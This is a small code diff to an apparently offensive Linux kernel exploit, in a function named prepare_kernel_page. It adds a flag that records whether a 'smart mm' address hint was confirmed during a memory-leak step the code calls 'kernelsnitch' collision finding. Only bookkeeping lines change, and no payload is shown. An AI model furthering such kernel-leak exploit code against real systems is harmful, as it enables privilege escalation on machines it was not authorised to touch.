@@ -2343,6 +2343,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
 #if defined(APP_SMART_MM_SEARCH) && APP_SMART_MM_SEARCH
   uintptr_t leaked = (uintptr_t)-1;
+  int final_hint_hit = 0;
   if (!kernelsnitch_found_collisions(ks)) {
     pr_warning("Smart-mm collision finding failed\\n");
     cleanup_failed_kernel_page("collision");
@@ -2381,6 +2382,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       ks = confirmed_state;
       memfd_leak = confirm_fd;
       leaked = confirmed_canonical;
+      final_hint_hit = 1;
       pr_info("smart mm hint confirmed base=%016zx mm=%016zx\\n",
               base_hint, leaked);
     } else {
@@ -2397,6 +2399,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     ks = first_state;
     leaked = first_canonical;
+    final_hint_hit = 0;
     pr_info("smart mm hint miss; retaining full-search mm=%016zx base=%016zx\\n",
             leaked, base_hint);
   }
